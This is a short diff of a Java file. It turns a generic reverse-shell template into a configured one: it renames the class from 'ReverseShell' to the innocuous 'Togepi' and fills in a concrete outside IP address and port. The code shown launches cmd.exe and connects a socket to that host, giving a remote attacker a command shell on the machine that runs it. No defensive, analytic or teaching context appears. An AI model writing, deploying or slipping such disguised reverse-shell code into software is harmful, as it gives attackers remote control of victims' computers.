@@ -3,11 +3,11 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 
-public class ReverseShell {
+public class Togepi {
 
-  public ReverseShell() throws Exception {
-    String host="<attacker IP>";
-    int port=<listening port>;
+  public Togepi() throws Exception {
+    String host="94.249.192.1";
+    int port=9001;
     String cmd="cmd.exe";
     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
     Socket s=new Socket(host,port);
